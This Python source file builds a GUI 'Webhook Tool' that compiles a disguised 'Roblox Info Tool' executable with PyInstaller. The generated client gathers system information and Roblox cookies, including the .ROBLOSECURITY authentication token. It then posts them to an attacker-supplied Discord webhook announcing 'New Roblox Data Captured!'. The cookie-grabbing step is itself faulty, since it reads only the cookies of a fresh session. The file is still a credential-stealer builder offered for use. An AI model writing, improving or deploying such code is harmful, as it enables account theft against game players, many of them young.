import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import os
import subprocess
import sys
import tempfile
import platform
import socket
import base64

class WebhookTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Webhook Tool")
        self.root.geometry("600x400")
        self.root.resizable(True, True)
        
        self.configure_styles()
        self.create_widgets()
    
    def configure_styles(self):
        style = ttk.Style()
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'))
        style.configure('Large.TButton', font=('Arial', 11), padding=10)
    
    def create_widgets(self):
        # Main frame
        main_frame = ttk.Frame(self.root, padding=20)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title_label = ttk.Label(main_frame, text="Webhook Tool", style='Title.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Webhook input
        webhook_frame = ttk.LabelFrame(main_frame, text="Webhook Configuration", padding=15)
        webhook_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(webhook_frame, text="Discord Webhook URL:").pack(anchor=tk.W)
        
        self.webhook_entry = ttk.Entry(webhook_frame, width=70, font=('Arial', 10))
        self.webhook_entry.pack(fill=tk.X, pady=5)
        
        test_btn = ttk.Button(webhook_frame, text="Test Webhook", 
                            command=self.test_webhook, style='Large.TButton')
        test_btn.pack(pady=10)
        
        # Build section
        build_frame = ttk.LabelFrame(main_frame, text="Application Builder", padding=15)
        build_frame.pack(fill=tk.X, pady=(0, 20))
        
        ttk.Label(build_frame, text="Create Executable:").pack(anchor=tk.W)
        
        build_btn = ttk.Button(build_frame, text="Build EXE", 
                             command=self.build_exe, style='Large.TButton')
        build_btn.pack(pady=10)
        
        # Status
        self.status_label = ttk.Label(main_frame, text="Ready", font=('Arial', 10))
        self.status_label.pack(pady=10)
        
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=5)
    
    def test_webhook(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL")
            return
        
        self.status_label.config(text="Testing webhook...")
        self.progress.start()
        
        try:
            data = {
                "embeds": [{
                    "title": "Webhook Test",
                    "description": "Webhook functionality test",
                    "color": 5814783,
                    "fields": [
                        {"name": "Status", "value": "✅ Webhook Working", "inline": True},
                        {"name": "Test", "value": "Successful", "inline": True}
                    ]
                }]
            }
            
            response = requests.post(webhook_url, json=data, timeout=10)
            
            if response.status_code == 204:
                self.status_label.config(text="✅ Webhook test successful!")
                messagebox.showinfo("Success", "Webhook test successful! Check your Discord.")
            else:
                self.status_label.config(text="❌ Webhook test failed")
                messagebox.showerror("Error", f"Webhook test failed. Status: {response.status_code}")
                
        except Exception as e:
            self.status_label.config(text="❌ Error testing webhook")
            messagebox.showerror("Error", f"Failed to test webhook: {str(e)}")
        finally:
            self.progress.stop()
    
    def build_exe(self):
        webhook_url = self.webhook_entry.get().strip()
        
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a webhook URL first")
            return
        
        self.status_label.config(text="Building executable...")
        self.progress.start()
        
        try:
            client_script = self.create_client_script(webhook_url)
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
                f.write(client_script)
                temp_script_path = f.name
            
            output_path = filedialog.asksaveasfilename(
                defaultextension=".exe",
                filetypes=[("Executable files", "*.exe")],
                title="Save EXE File",
                initialfile="Tool.exe"
            )
            
            if not output_path:
                os.unlink(temp_script_path)
                self.status_label.config(text="Build cancelled")
                self.progress.stop()
                return
            
            self.status_label.config(text="Compiling... This may take a minute.")
            self.root.update()
            
            # Build with PyInstaller
            subprocess.run([
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--windowed',
                '--name', os.path.basename(output_path).replace('.exe', ''),
                temp_script_path
            ], check=True, timeout=120)
            
            os.unlink(temp_script_path)
            self.status_label.config(text="✅ EXE built successfully!")
            messagebox.showinfo("Success", "Executable built successfully! Check the 'dist' folder.")
            
        except Exception as e:
            self.status_label.config(text="❌ Build failed")
            messagebox.showerror("Error", f"Build failed: {str(e)}")
        finally:
            self.progress.stop()
    
    def create_client_script(self, webhook_url):
        return f'''import requests
import tkinter as tk
from tkinter import messagebox
import platform
import socket
import base64
from io import BytesIO

def get_system_info():
    """Get system information"""
    try:
        hostname = socket.gethostname()
        system = platform.system()
        version = platform.version()
        
        return f"""
**System Information:**
- Computer Name: {{hostname}}
- Operating System: {{system}}
- Version: {{version}}
"""
    except:
        return "**System information unavailable**"

def get_roblox_info():
    """Get Roblox username and profile picture using cookies"""
    try:
        session = requests.Session()
        
        # First get cookies from Roblox
        url = 'https://www.roblox.com/home'
        headers = {{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }}
        
        response = session.get(url, headers=headers, timeout=10)
        cookies = session.cookies.get_dict()
        
        # Get the .ROBLOSECURITY cookie
        roblosecurity = cookies.get('.ROBLOSECURITY', 'Not found')
        
        # If we have the auth cookie, try to get user info
        username = "Unknown"
        avatar_url = ""
        
        if roblosecurity != 'Not found':
            try:
                # Get current user info
                auth_headers = {{
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Cookie': f'.ROBLOSECURITY={{roblosecurity}}'
                }}
                
                # Try to get user info from Roblox API
                user_response = session.get(
                    'https://users.roblox.com/v1/users/authenticated',
                    headers=auth_headers,
                    timeout=10
                )
                
                if user_response.status_code == 200:
                    user_data = user_response.json()
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data.get('id', '')
                    
                    # Get avatar thumbnail
                    if user_id:
                        avatar_response = session.get(
                            f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={{user_id}}&size=48x48&format=Png',
                            headers=auth_headers,
                            timeout=10
                        )
                        
                        if avatar_response.status_code == 200:
                            avatar_data = avatar_response.json()
                            if avatar_data.get('data'):
                                avatar_url = avatar_data['data'][0].get('imageUrl', '')
                
            except Exception as e:
                username = f"Error getting username: {{str(e)}}"
        
        # Build cookie info
        cookie_details = "**All Cookies Found:**\\\\n"
        for cookie_name, cookie_value in cookies.items():
            cookie_details += f"- **{{cookie_name}}**: {{cookie_value[:50]}}...\\\\n" if len(str(cookie_value)) > 50 else f"- **{{cookie_name}}**: {{cookie_value}}\\\\n"
        
        return {{
            "username": username,
            "avatar_url": avatar_url,
            "roblosecurity": roblosecurity,
            "cookie_details": cookie_details,
            "total_cookies": len(cookies)
        }}
        
    except Exception as e:
        return {{
            "username": "Error",
            "avatar_url": "",
            "roblosecurity": "Error",
            "cookie_details": f"**Error:** {{str(e)}}",
            "total_cookies": 0
        }}

def send_to_webhook():
    """Send data to webhook"""
    try:
        system_info = get_system_info()
        roblox_info = get_roblox_info()
        
        # Create the webhook message
        embed = {{
            "title": "🔍 Roblox Information Captured",
            "color": 15105570,
            "fields": [
                {{
                    "name": "👤 Roblox Username",
                    "value": f"```{{roblox_info['username']}}```",
                    "inline": True
                }},
                {{
                    "name": "🔐 Authentication Cookie",
                    "value": f"```{{roblox_info['roblosecurity'][:50]}}...```" if len(roblox_info['roblosecurity']) > 50 else f"```{{roblox_info['roblosecurity']}}```",
                    "inline": True
                }},
                {{
                    "name": "🍪 Total Cookies Found",
                    "value": f"```{{roblox_info['total_cookies']}}```",
                    "inline": True
                }},
                {{
                    "name": "💻 System Info",
                    "value": system_info,
                    "inline": False
                }},
                {{
                    "name": "📋 Cookie Details",
                    "value": roblox_info['cookie_details'],
                    "inline": False
                }}
            ],
            "thumbnail": {{
                "url": roblox_info['avatar_url'] if roblox_info['avatar_url'] else "https://cdn.discordapp.com/embed/avatars/0.png"
            }}
        }}
        
        data = {{
            "content": "🎯 New Roblox Data Captured!",
            "embeds": [embed]
        }}
        
        response = requests.post("{webhook_url}", json=data, timeout=15)
        
        if response.status_code == 204:
            messagebox.showinfo("Success", 
                              f"✅ Data sent successfully!\\\\n\\\\n"
                              f"**Username:** {{roblox_info['username']}}\\\\n"
                              f"**Cookies Found:** {{roblox_info['total_cookies']}}")
        else:
            messagebox.showerror("Error", f"❌ Failed to send data. Status: {{response.status_code}}")
                               
    except Exception as e:
        messagebox.showerror("Error", f"❌ Failed to send data: {{str(e)}}")

def main():
    root = tk.Tk()
    root.title("Roblox Info Tool")
    root.geometry("500x350")
    root.configure(bg='#2C2F33')
    root.resizable(False, False)
    
    # Title with Roblox theme
    title_label = tk.Label(root, text="🎮 Roblox Info Tool", 
                          font=('Arial', 18, 'bold'),
                          fg='#FFFFFF', bg='#2C2F33')
    title_label.pack(pady=20)
    
    # Description
    description = tk.Label(root, 
                         text="Click the button to get Roblox information\\\\nand send it to the webhook",
                         font=('Arial', 11),
                         fg='#B9BBBE', bg='#2C2F33')
    description.pack(pady=10)
    
    # Main button
    run_btn = tk.Button(root, text="🚀 Get Roblox Info",
                        command=send_to_webhook,
                        bg='#00A2FF', fg='white',
                        font=('Arial', 14, 'bold'),
                        width=20, height=2,
                        relief='raised',
                        bd=0)
    run_btn.pack(pady=30)
    
    # Info text
    info_label = tk.Label(root, 
                         text="This will collect Roblox username, profile picture, and cookie data",
                         font=('Arial', 9),
                         fg='#72767D', bg='#2C2F33')
    info_label.pack(side=tk.BOTTOM, pady=15)
    
    root.mainloop()

if __name__ == "__main__":
    main()
'''

if __name__ == "__main__":
    root = tk.Tk()
    app = WebhookTool(root)
    root.mainloop()
